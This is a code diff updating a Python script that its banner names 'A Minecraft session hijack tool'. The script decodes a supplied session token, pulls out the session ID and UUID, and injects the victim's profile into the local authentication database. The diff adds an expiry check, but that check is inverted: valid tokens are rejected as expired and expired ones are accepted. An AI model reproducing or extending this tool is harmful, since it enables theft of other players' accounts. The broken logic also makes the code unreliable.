@@ -4,8 +4,8 @@ import re
 import json
 import requests
 import time
+import sys
 
-from sys import argv
 from colorama import Fore, init
 
 # constants
@@ -38,6 +38,10 @@ def validate_token(token):
         return
     return True
 
+def validate_time(epoch):
+    """ checks if current time is greater than the expiration date """
+    return time.time() > epoch
+
 # getters
 def get_time():
     """ returns current local time """
@@ -56,7 +60,7 @@ def get_data(token):
     """ returns session ID and UUID """
     parts = token.split(".")
     data = json.loads(base64.b64decode(f"{parts[1]}=".encode()).decode())
-    return (data["spr"], data["sub"])
+    return (data["spr"], data["sub"], data["exp"])
 
 def inject(profile):
     """ injects the new profile to the local authentication database """
@@ -75,14 +79,14 @@ def main():
 {0}                  w           8           
 {0} 8d8b.d8b. .d8b   w .d88 .d8b 8.dP            {1}A Minecraft session hijack tool
 {0} 8P Y8P Y8 8      8 8  8 8    88b             {1}written in Python 3 by {2}wodx{1}.
-{0} 8   8   8 `Y8P   8 `Y88 `Y8P 8 Yb  {2}v1.0.0
+{0} 8   8   8 `Y8P   8 `Y88 `Y8P 8 Yb  {2}v1.1.0
 {0}                wdP
 
  {3}www.twitter.com/wodxgod{0} - {4}www.youtube.com/wodxgod{0} - {5}www.github.com/WodXTV
     {1}""".format(Fore.LIGHTBLACK_EX, Fore.RESET, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN))
 
     try:
-        token = argv[1]
+        token = sys.argv[1]
 
         if not validate_token(token):
             print_error("Invalid session token")
@@ -94,7 +98,12 @@ def main():
 
         print_info(f"Reading token data...")
         
-        uuid, sid = get_data(token)
+        uuid, sid, unix = get_data(token)
+
+        if not validate_time(unix):
+            print_error(f"Session token has expired")
+            return
+
         name = get_name(uuid)
 
         if not name:
@@ -114,12 +123,9 @@ def main():
 
     except Exception as e:
         if isinstance(e, IndexError):
-            print(f"Usage: py {argv[0]} <session token>")
+            print(f"Usage: py {sys.argv[0]} <session token>")
         else:
             print_error(f"Something went wrong: {str(e)}")
 
 if __name__ == "__main__":
-    try:
-        main()
-    except:
-        pass
+    main()
